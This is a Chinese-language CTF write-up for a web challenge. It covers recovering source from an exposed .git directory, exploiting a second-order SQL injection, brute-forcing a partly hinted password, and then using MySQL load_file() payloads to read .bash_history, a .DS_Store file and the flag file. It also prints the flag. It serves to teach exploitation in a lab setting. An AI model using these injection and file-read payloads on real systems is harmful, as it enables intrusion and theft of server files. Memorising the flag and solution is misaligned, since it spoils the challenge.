# Comment

# SQL读取文件

> 用load_file()函数进行读取,值得注意的是读取文件并返回文件内容为字符串.要使用此函数,文件必须位于服务器主机上,必须指定完整路径的文件,而且必须有FILE权限.该文件所有字节可读,但文件内容必须小于max_allowed_packet.如果该文件不存在或无法读取,因为前面的条件之一不满足,函数返回 NULL.

## 思路分析

> 扫目录,扫到了.git/和login.php这二个目录.首先使用git泄漏工具下载源码,先说下,自从国内爆出来git反制之后,国内开发者开发的大部分工具把下载.git目录对象的功能去掉了,只下载.git目录下面的文件.感觉这有点太极端了.找了好久,发现国外开发的git-dumper还可以下载.git目录对象.下载后得到一个源码,这段代码有点少,结合浏览器控制台打印了一段话:程序员GIT写一半跑路了,都没来得及Commit :),推测下载的源码并不完全.

> 使用git log --all查看git记录,发现e5b2a2443c2b6d395d06960123142bc91123148c是还未上传到git上的记录.使用git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c得到全部代码.

> 从代码中可以看到在comment部分对从数据库中取出的category没有过滤,这造成了二次注入.这里的二次注入表现为,addslashes过滤后产生的\不会进入数据库,即'1过滤后变成\'1,进入库中却仍为'1,我们在取出数据后进行二次拼接,即可造成注入.

> 在发帖处构造category为:

```
', content=user(),/*
```

> 在留言处输入的content为:

```
*/#
```

> 最终的sql语句如下,

```
$sql = "insert into comment set category = '', content=user(),/*  content = '*/#', bo_id = '$bo_id'";
```

> 回到登陆页面,登录框内已提示账号为zhangwei,密码为zhangwei***,最后三个星号代表了未知字符,对这三个字符进行爆破,得到密码为zhangwei666.

> 登陆后发帖即可,直接通过sql注入发现获取不了数据,得通过读取文件的方式进行.

```
', content=load_file('/home/www/.bash_history'),/*
```

> 可以看到当前项由html.zip在原本/tmp目录下解压再复制到/var/www,并且记录了关于项目html文件结构的.DS_Store在/tmp目录中仍存在一份,去读取这个文件了解下项目结构.可能由于乱码问题所以无法完全读取,这里采用对其转成16进制.

```
',content=((select(hex(load_file("/tmp/html/.DS_Store"))))),/*
```

> 可以将得到的16进制写入文件再用相关的.DS_Store文件解析器去解析,但是此处都没显示完全（可以看到16进制末尾是一串...）,所以直接转换成ASCII字符来查看也是可行的.看到有flag_8946e1ff1ee3e40f.php,读取该文件,获取到flag.

```
',content=((select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php")))),/*
```

## payload

```
',content=((select(load_file("/var/www/html/flag_8946e1ff1ee3e40f.php")))),/*
```

## flag

> flag{0dd14aae81d94904b3492117e2a3d4df}

## 参考

> https://www.cnblogs.com/Article-kelp/p/16077919.html
> https://www.jianshu.com/p/b7b664d7f18c